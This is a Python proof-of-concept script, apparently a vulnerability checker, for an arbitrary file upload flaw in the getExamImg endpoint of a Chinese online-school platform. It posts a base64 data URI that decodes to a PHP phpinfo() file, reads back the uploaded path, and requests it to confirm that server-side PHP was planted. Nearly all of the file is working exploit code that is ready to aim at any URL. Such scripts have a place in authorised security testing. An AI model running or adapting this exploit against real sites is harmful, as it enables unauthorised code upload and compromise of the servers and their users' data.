import requests
import argparse
requests.packages.urllib3.disable_warnings()

def main():
    banner = """
░▒▓███████▓▒░░▒▓████████▓▒░▒▓████████▓▒░▒▓████████▓▒░▒▓██████▓▒░▒▓████████▓▒░▒▓█▓▒░░▒▓██████▓▒░░▒▓███████▓▒░  
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░         ░▒▓█▓▒░   ░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░   ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░         ░▒▓█▓▒░   ░▒▓█▓▒░     ░▒▓█▓▒░        ░▒▓█▓▒░   ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░▒▓██████▓▒░    ░▒▓█▓▒░   ░▒▓██████▓▒░░▒▓█▓▒░        ░▒▓█▓▒░   ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░         ░▒▓█▓▒░   ░▒▓█▓▒░     ░▒▓█▓▒░        ░▒▓█▓▒░   ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░         ░▒▓█▓▒░   ░▒▓█▓▒░     ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░   ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
░▒▓███████▓▒░░▒▓████████▓▒░  ░▒▓█▓▒░   ░▒▓████████▓▒░▒▓██████▓▒░  ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░                                                                       

    """
    print(banner)
    parse = argparse.ArgumentParser(description="云课网校系统getExamlmg文件上传漏洞")
    parse.add_argument('-u', '--url', dest='url', type=str, help='请输入URL地址')
    args = parse.parse_args()
    domain=args.url
    if 'http' in domain:
        check(domain)
    else:
        check(f"http://{domain}")
def check(domain):
    url=f"{domain}/index/Exam/getExamImg"
    headers={
        'Content-Type': 'application/x-www-form-urlencoded',
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36'
    }
    data="src_data=data:image/php;base64,PD9waHAgcGhwaW5mbygpPz4="    #上传phpinfo的base64编码
    try:
        response1=requests.post(url=url,headers=headers,data=data,verify=False,timeout=3)
        upload_path=response1.json()['src']  #正则匹配路径
        try:
            response2=requests.get(f"{domain}{upload_path}",headers=headers,verify=False,timeout=3)
            if response2.status_code==200:
                print(f"上传成功:{domain}{upload_path}")   #上传成功的文件路径
            else:
                print(f"上传失败，响应状态码:{response2.status_code}")
        except Exception as e:
            print(e)
    except Exception as e:
        print(e)

if __name__ == '__main__':
    main()